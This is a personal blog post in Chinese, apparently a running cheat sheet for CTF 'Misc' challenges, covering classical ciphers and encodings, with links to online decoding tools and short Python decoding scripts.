<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="允许一切如其所是">
    <meta name="author" content="C3ngH">
    
    <title>
        
            Misc All In One（持续施工） |
        
        C3ngH&#39;s B10g
    </title><meta name="robots" content="noindex">
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"c3ngh.top","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"C3ngH's B10g","author":"C3ngH","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","logo":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","favicon":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"},"menu":{"home":"/","archives":"/archives","links":"/links","设备":"/devices","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"CTF Misc / A1natas Team / V＆N Team / More","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/zch050217","weixin":null,"qq":"./images/qqQRcode.jpg","weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":"https://blog-waline-weld.vercel.app/","reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"links":[{"title":"A1natas's Teammates"},{"name":"Lunatic - Misc指路人@星盟安全团队","link":"https://goodlunatic.github.io/","description":"Mind and Hand :)","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Lunatic.png"},{"name":"A1ic3 - Crypto@V&N","link":"https://a1ic3.cn/","description":"希望成为一个有趣的人","avatar":"https://www.a1ic3.cn/avatar.png"},{"name":"PangBai - Reverse@W&M","link":"https://pangbai.work/","description":"世上所有不利都是当事人无能所致","avatar":"http://pangbai.work/images/avatar.jpg"},{"name":"void2eye - Web@WpgSec狼组安全","link":"https://void2eye.fun/","description":"临渊羡鱼，不如退而结网。","avatar":"https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/808.png"},{"name":"carbofish - 全栈@r3kapig","link":"https://carbo.ink/","description":"lfy,wcnm!","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/CarboFish.jpg"},{"name":"AsaL1n - Web@V&N","link":"https://asal1n.github.io/","description":"why we need that?","avatar":"https://asal1n.github.io/img/head.jpg"},{"name":"enllus1on - Pwn@Nu1L","link":"https://enllus1on.github.io/","description":"pwn for more","avatar":"https://enllus1on.github.io/images/kano.jpg"},{"name":"Straw - Reverse","link":"https://straw-233.github.io/","description":"午门痴","avatar":"https://straw-233.github.io/avatar/meinasi.png"},{"name":"CHHHCHHOH - Web","link":"https://chhhchhoh.cn/","description":"吃了乙酸的乙醇会不会梦到乙酸乙酯？","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/zyc.png"},{"name":"WoodWhale - 全栈@r3kapig","link":"https://woodwhale.cn/","description":"A happy woodwhale!","avatar":"https://www.woodwhale.cn/woodwhale.png"},{"name":"XunFlash - Reverse","link":"https://www.xunflash.top/","description":"你好","avatar":"https://www.xunflash.top/icon.png"},{"name":"huanghunr - Reverse","link":"https://blog.huanghunr.top","description":"喵喵喵?!还没想好","avatar":"https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg"},{"name":"温婳霂 - Misc@V&N","link":"https://somokel.github.io","description":"春祺夏安，秋绥冬宁。","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/wenhuamu.jpg"},{"name":"MetaVi - Misc","link":"https://metaviii.github.io","description":"Add a touch of fantasy?","avatar":"https://s2.loli.net/2024/12/04/jJpynvQUCA3RlIG.jpg"},{"title":"V&N's Teammates"},{"name":"Aecous","link":"https://aecous.github.io/","description":"web✌","avatar":"https://aecous.github.io/images/me.png"},{"name":"yixinBC","link":"https://blog.buyix.in/","avatar":"https://c.img.dasctf.com/LightPicture/2024/08/c6a64c00f2c066f8.jpg","description":"超级菜浑水摸鱼手"},{"title":"Other CTFer"},{"name":"sheep","link":"https://s1nec-1o.github.io/","description":"努力学习的pwner(ROIS✌","avatar":"https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"},{"name":"LilRan","link":"https://blog.xinshi.fun/","description":"今日启程 无畏向前","avatar":"https://blog.xinshi.fun/assets/avatar.png"},{"name":"_sun_","link":"https://sun1028.top/","description":"我也不知道要啥描述","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/sun.jpg"},{"name":"G3rling","avatar":"https://g3rling.top/wp-content/uploads/2024/03/头像.jpg","description":"少说话，多做事","link":"https://g3rling.top/"},{"name":"Mia","avatar":"https://miablog.oss-cn-nanjing.aliyuncs.com/img/Mia.png","link":"https://blog.miamia.top","description":"无论如何，感谢经历。"},{"name":"清酒","avatar":"http://clearwine.online/images/qingjiu.jpg","link":"http://clearwine.online/","description":"旅途还在继续，谁也不知道他会在什么时候到达终点。"},{"title":"战队"},{"name":"A1natas","link":"https://www.a1natas.com/","description":"ZJNU A1natas Group","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/A1natas.png"},{"name":"V&N","link":"https://vnteam.cn/","description":"V&N Union CTF Team","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VN.png"}]},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                </a>
            
            <a class="site-name border-box" href="/">
               C3ngH&#39;s B10g
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                首页
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                归档
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/links">
                                
                                友链
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/devices">
                                
                                设备
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/about">
                                
                                关于
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            首页
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            归档
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
                            
                            友链
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/devices">
                            
                            设备
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
                            
                            关于
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        Misc All In One（持续施工）
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">C3ngH</span>
                                
                                    <span class="author-badge">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2024-07-17 09:32:48</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Sun Feb 02 2025 23:48:09 GMT+0800">2025-02-02 23:48:09</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Misc/">Misc</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>25k 字</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>114 分钟</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p>感谢Lunatic学长的<a class="link"   target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/1ad9200/" >CTF-Misc-Guide<i class="fas fa-external-link-alt"></i></a>指路</p>
<h3 id="编码-加密">编码/加密</h3>
<h4 id="Base家族">Base家族</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://cyberchef.org/" >https://cyberchef.org/<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#flag</span><br><span class="line"></span><br><span class="line">666C6167				#base16</span><br><span class="line">MZWGCZY=				#base32[A-Z2-7]</span><br><span class="line">727432					#base36</span><br><span class="line">3cr9Ae					#base58</span><br><span class="line">Zmxh					#base64</span><br><span class="line">Ao(mg					#base85</span><br><span class="line">@iH&lt;Z					#base91</span><br><span class="line">F#S&lt;I					#base92</span><br></pre></td></tr></table></figure>
<p>base64可以换表编码</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表：sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ</span><br><span class="line">密文：SjaoNgS0xgagUTpwe3QwHn4MrbkD/OUwqOQG/bpveg6Mqa4WH0k46</span><br></pre></td></tr></table></figure>
<h4 id="MD5">MD5</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.cmd5.com/" >https://www.cmd5.com/<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#flag&#123;md5&#125;</span><br><span class="line"></span><br><span class="line">121b1afe793917a2cc0fc60a4eb2d3c6	#32位</span><br><span class="line">121b1afe793917a2cc0fc60a4eb2d3c6	#16位</span><br><span class="line"></span><br><span class="line">#16位是取32位的8-24位</span><br></pre></td></tr></table></figure>
<h4 id="Byte类型">Byte类型</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240717101203760.png"
                        alt="image-20240717101203760"
                 ></p>
<h4 id="emoji-AES">emoji-AES</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/" >https://aghorler.github.io/emoji-aes/<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🌊🚰✖😇😊🐍😀🔪😇🚰🎈🏎😂❓😁🍎👑⏩🚫❓🎅🎃😡⌨☀🍌😁✖😂🏎🍌🎃🗒</span><br><span class="line">明文：flag</span><br><span class="line">密钥：key</span><br></pre></td></tr></table></figure>
<h4 id="emoji解码">emoji解码</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937" >http://www.atoolbox.net/Tool.php?Id=937<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐯👏👋🐾👚👪👇👱👞👚🐦👡👙👚👏👍🐯👏🐽👐👜🐦👇👱👜👙👤👡👙🐬👥🐻🐯👏👋👈👚👪👇👘👰👛👮👡👙👎🐭🐯</span><br></pre></td></tr></table></figure>
<h4 id="二维码">二维码</h4>
<p>解码在线网站：<a class="link"   target="_blank" rel="noopener" href="https://cli.im/deqr/other" >https://cli.im/deqr/other<i class="fas fa-external-link-alt"></i></a></p>
<p>分析修复在线网站：<a class="link"   target="_blank" rel="noopener" href="https://merri.cx/qrazybox/" >https://merri.cx/qrazybox/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="频次分析">频次分析</h4>
<p>字频分析：<a class="link"   target="_blank" rel="noopener" href="https://lzltool.cn/Tools/LetterFrequency" >https://lzltool.cn/Tools/LetterFrequency<i class="fas fa-external-link-alt"></i></a></p>
<p>词频分析：<a class="link"   target="_blank" rel="noopener" href="https://quipqiup.com/" >https://quipqiup.com/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="摩斯电码">摩斯电码</h4>
<p>可能只有<code>.-</code>或<code>0 1</code>组成，也可能是其他只有两种字符的情况，通常会使用空格、换行或<code>/</code>进行分割</p>
<h4 id="维吉尼亚密码">维吉尼亚密码</h4>
<ul>
<li>给出密钥 -&gt; CyberChef</li>
<li>没有密钥 -&gt; 根据对照表手搓密钥</li>
</ul>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/vigenere" >https://ctf.bugku.com/tool/vigenere<i class="fas fa-external-link-alt"></i></a></p>
<p>维吉尼亚flag爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#By C3ngH</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = []</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    key_index = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            key_char = key[key_index % key_length]</span><br><span class="line">            shift = <span class="built_in">ord</span>(key_char.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            plaintext.append(decrypted_char)</span><br><span class="line">            key_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext.append(char)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_bruteforce</span>(<span class="params">ciphertext, known_plaintext, max_key_length</span>):</span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    </span><br><span class="line">    keyspace = string.ascii_uppercase</span><br><span class="line">    ciphertext = ciphertext</span><br><span class="line">    known_plaintext = known_plaintext</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_key_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> key_tuple <span class="keyword">in</span> product(keyspace, repeat=key_length):</span><br><span class="line">            key = <span class="string">&#x27;&#x27;</span>.join(key_tuple)</span><br><span class="line">            decrypted_text = vigenere_decrypt(ciphertext[:<span class="built_in">len</span>(known_plaintext)], key)</span><br><span class="line">            <span class="comment"># 只比较字母字符</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">filter</span>(<span class="built_in">str</span>.isalpha, decrypted_text)) == <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">filter</span>(<span class="built_in">str</span>.isalpha, known_plaintext)):</span><br><span class="line">                <span class="keyword">return</span> key, vigenere_decrypt(ciphertext, key)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例输入</span></span><br><span class="line">ciphertext = <span class="built_in">input</span>(<span class="string">&quot;输入待解密的密文: &quot;</span>)</span><br><span class="line">known_plaintext = <span class="built_in">input</span>(<span class="string">&quot;输入flag的开头部分: &quot;</span>)</span><br><span class="line">max_key_length = <span class="built_in">len</span>(known_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破密钥</span></span><br><span class="line">key, decrypted_message = vigenere_bruteforce(ciphertext, known_plaintext, max_key_length)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;成功解密flag: <span class="subst">&#123;decrypted_message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="希尔密码">希尔密码</h4>
<p>已知密文和密钥，并且密钥(key)是一个网址，如<a class="link"   target="_blank" rel="noopener" href="http://www.verymuch.net" >http://www.verymuch.net<i class="fas fa-external-link-alt"></i></a></p>
<p>已知密文和密钥，并且密钥是四个数字</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne</span><br><span class="line">密钥：3 4 19 11</span><br></pre></td></tr></table></figure>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.metools.info/code/hillcipher243.html" >https://www.metools.info/code/hillcipher243.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Rabbit加密">Rabbit加密</h4>
<p>密文形式类似base64，但可能有<code>+</code>号</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rabbit.html" >https://www.sojson.com/encrypt_rabbit.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="幂数加密-云影密码">幂数加密/云影密码</h4>
<p>密文只由<code>0 1 2 4 8</code>组成</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;C:/Users/67300/Download/1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:	<span class="comment">#修改路径</span></span><br><span class="line">    data = f.read()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = data.split(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">datalist=[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlist</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            d += <span class="built_in">int</span>(j)</span><br><span class="line">        datalist.append(d)</span><br><span class="line">        d=<span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> datalist</span><br><span class="line">datalist = dlist(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str</span>(<span class="params">datalist</span>):</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> datalist:</span><br><span class="line">        s += <span class="built_in">chr</span>(i+<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(datalist))</span><br></pre></td></tr></table></figure>
<h4 id="曼彻斯特编码-差分曼彻斯特编码">曼彻斯特编码 &amp; 差分曼彻斯特编码</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240529203318823.png"
                        alt="image-20240529203318823"
                 ></p>
<p>详见：<a href="https://c3ngh.top/2024/03/24/rkwg2/">数据通信基础 4.1| C3ngH’s B10g</a></p>
<p>使用曼彻斯特编码转换工具进行转换</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240717103504292.png"
                        alt="image-20240717103504292"
                 ></p>
<h4 id="社会主义核心价值观编码">社会主义核心价值观编码</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://www.hiencode.com/cvencode.html" >http://www.hiencode.com/cvencode.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="音符解密">音符解密</h4>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</span><br></pre></td></tr></table></figure>
<p>注意：加密的密文一定是以=结尾的，如果没有需要自己加</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" >https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="敲击码">敲击码</h4>
<p>基于5×5方格波利比奥斯方阵实现，不同点是是用K字母被整合到C中，因此密文的特征为1-5的两位一组的数字，编码的范围是A-Z字母字符集，字母不区分大小写。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/tapcode.png"
                        alt="tapcode"
                 ></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="http://www.hiencode.com/tapcode.html" >http://www.hiencode.com/tapcode.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="盲文">盲文</h4>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" >https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="Polybius密码">Polybius密码</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/polybius.png"
                        alt="polybius"
                 ></p>
